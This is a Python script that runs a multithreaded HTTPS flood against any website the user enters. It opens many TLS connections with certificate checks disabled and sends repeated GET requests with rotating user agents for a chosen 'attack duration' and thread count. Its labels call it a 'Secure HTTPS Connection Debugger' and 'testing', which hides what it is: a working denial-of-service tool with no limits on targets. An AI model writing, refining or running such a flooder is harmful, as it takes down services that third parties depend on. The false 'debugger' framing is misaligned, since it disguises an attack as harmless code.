import ssl
import socket
import threading
import random
import time
import sys

# ✅ Random User-Agent Generator (Enhanced)
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QD1A.190505.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    ]
    return random.choice(user_agents)

# ✅ Secure HTTPS Connection & Request Handling
def https_flood(target_host, target_port, duration):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)  # Ensure TLS 1.2/1.3
    context.check_hostname = False  # Debugging purpose
    context.verify_mode = ssl.CERT_NONE  # Ignore SSL certificate issues (Only for testing)

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            # Create a secure connection
            with socket.create_connection((target_host, target_port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=target_host) as ssl_sock:
                    http_request = (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {target_host}\r\n"
                        f"User-Agent: {random_user_agent()}\r\n"
                        "Connection: keep-alive\r\n\r\n"
                    )
                    ssl_sock.sendall(http_request.encode('utf-8'))
                    print(f"✅ Sent HTTPS request to {target_host}:{target_port}")

        except ssl.SSLError as e:
            print(f"❌ [SSL ERROR]: {e}")
            break  # Stop execution on SSL errors

        except socket.timeout:
            print("⚠️ [TIMEOUT]: Server took too long to respond.")

        except socket.error as e:
            print(f"❌ [SOCKET ERROR]: {e}")
            break

        except Exception as e:
            print(f"❌ [UNKNOWN ERROR]: {e}")
            break

# ✅ Main Function with Input Validation & Optimizations
def main():
    print("=== 🔥 Secure HTTPS Connection Debugger ===")

    # Get target URL & Port
    target_url = input("Enter target website URL (e.g., www.example.com): ").strip()
    target_port = input("Enter target port (default is 443 for HTTPS): ").strip()
    target_port = int(target_port) if target_port.isdigit() else 443  # Default to 443

    # Resolve Domain to IP
    try:
        target_host = socket.gethostbyname(target_url)
        print(f"🔍 Resolved IP Address: {target_host}")
    except socket.gaierror:
        print("❌ Error: Unable to resolve target URL. Exiting.")
        sys.exit()

    # Get attack duration & thread count (with validation)
    try:
        duration = int(input("Enter attack duration (in seconds): ").strip())
        threads = int(input("Enter number of threads (e.g., 100): ").strip())

        if duration <= 0 or threads <= 0:
            raise ValueError("❌ Error: Duration and thread count must be positive numbers.")
        
        print(f"🚀 Launching {threads} threads to test SSL requests for {duration} seconds.")

    except ValueError as e:
        print(f"❌ Invalid Input: {e}")
        sys.exit()

    # Launch HTTPS Flood (Debugging Mode)
    for _ in range(threads):
        thread = threading.Thread(target=https_flood, args=(target_host, target_port, duration))
        thread.daemon = True  # Background execution
        thread.start()
        time.sleep(0.01)  # Small delay to prevent overload

    time.sleep(duration)
    print("✅ Testing finished.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user.")
